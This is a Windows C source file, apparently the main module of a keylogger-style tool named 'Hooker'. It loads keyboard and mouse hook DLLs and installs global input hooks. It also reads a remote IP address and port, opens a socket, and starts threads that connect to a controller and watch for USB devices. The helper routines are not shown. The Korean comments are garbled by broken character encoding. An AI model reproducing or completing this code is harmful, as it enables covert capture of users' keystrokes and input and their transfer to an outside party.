#include "modules.h"


HINSTANCE g_hInst;
LPCTSTR lpszClass = TEXT("Hooker");
HWND hWndMain;
SOCKET hSocket;
SOCKADDR_IN hAddr;
HANDLE hFile;
HANDLE Con_pThread, USB_pThread;
DWORD dwResult;
BOOL isEof = FALSE;

typedef BOOL(*HookProc)();

HINSTANCE KhinstDll;//�ε��� �ν��Ͻ������� dll���� Ű������
HINSTANCE MhinstDll;//���콺��

HookProc Kinstallhook;//Ű����
HookProc Kuninstallhook;

HookProc Minstallhook;//���콺
HookProc Muninstallhook;

char ip[17];
char Port[6];


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance//int main���Ұ� ������ �޴� ���ڰ� �ٸ��Ƿ� api���α׷��ֽÿ��� WinMain�� ���
	, LPSTR lpszCmdParam, int nCmdShow)
{
	HWND hWnd;
	MSG Message;
	WNDCLASS WndClass;
	WSADATA wsaData;

	setlocale(LC_ALL, "Korean");

	g_hInst = hInstance;
	//������ ����
	WndClass.cbClsExtra = 0;
	WndClass.cbWndExtra = 0;
	WndClass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	WndClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	WndClass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	WndClass.hInstance = hInstance;
	WndClass.lpfnWndProc = WndProc;
	WndClass.lpszClassName = lpszClass;
	WndClass.lpszMenuName = NULL;
	WndClass.style = CS_HREDRAW | CS_VREDRAW | CS_OWNDC;
	RegisterClass(&WndClass);

	hWnd = CreateWindow(lpszClass, lpszClass, WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
		NULL, (HMENU)NULL, hInstance, NULL);

	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		MessageBox(hWnd, TEXT("WSAStartUp Failed"), TEXT("Error"), MB_OK);

	hWndMain = hWnd;
	//���ϻ���
	ReadAddr();
	CreateSocket();
	//������Ŀ���� ���ӽõ��� ������ ���� ,USB ������ ������ ����
	Con_pThread = (HANDLE)_beginthreadex(NULL, 0, ConnectProc, NULL, 0, 0);
	USB_pThread = (HANDLE)_beginthreadex(NULL, 0, USBDetector, NULL, 0, 0);
	

	
	while (GetMessage(&Message, NULL, 0, 0)) {
		TranslateMessage(&Message);
		DispatchMessage(&Message);
	}

	
	return (int)Message.wParam;

}


LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM IParam)//�������� �������� ����� �����ϴ� �Լ� �ռ� peek�޽����κ��� �޽����� ���޹��� �� ó��
{


	switch (iMessage)
	{
	case WM_CREATE:

	    KhinstDll = LoadLibrary(TEXT("KeyHookDll.dll"));
		MhinstDll = LoadLibrary(TEXT("MouseHookDll.dll"));

		if (KhinstDll == NULL || MhinstDll == NULL)
		{
			MessageBox(hWnd, TEXT("dll�ε� ����"), TEXT("����"), MB_OK);
			FreeLibrary(KhinstDll);
			ExitProcess(1);
		}

		Kinstallhook = (HookProc)GetProcAddress(KhinstDll,"StartHook");
		Kuninstallhook = (HookProc)GetProcAddress(KhinstDll,"StopHook");

		Minstallhook = (HookProc)GetProcAddress(MhinstDll, "StartHook");
		Muninstallhook = (HookProc)GetProcAddress(MhinstDll, "StopHook");

		if (Kinstallhook == NULL || Kuninstallhook == NULL || Minstallhook == NULL || Muninstallhook == NULL)
		{

			MessageBox(hWnd, TEXT("�Լ��ε� ����"), TEXT("����"), MB_OK);
			FreeLibrary(KhinstDll);
			ExitProcess(1);
		}
		
		Kinstallhook();
		Minstallhook();
		
		return 0;
		

	case WM_DESTROY:

		closesocket(hSocket);
		Kuninstallhook();
		Muninstallhook();
		FreeLibrary(KhinstDll);
		WSACleanup();
		KillProcess(TEXT("Controller.exe"));
		PostQuitMessage(0);
		return 0;
	}
	return DefWindowProc(hWnd, iMessage, wParam, IParam);


}



//Ű�ΰ� ��������� �����ڵ����޾ȵ�
//���Ͼ����� ���۱�� �߰�
//ReadAddr ���� _tcstok����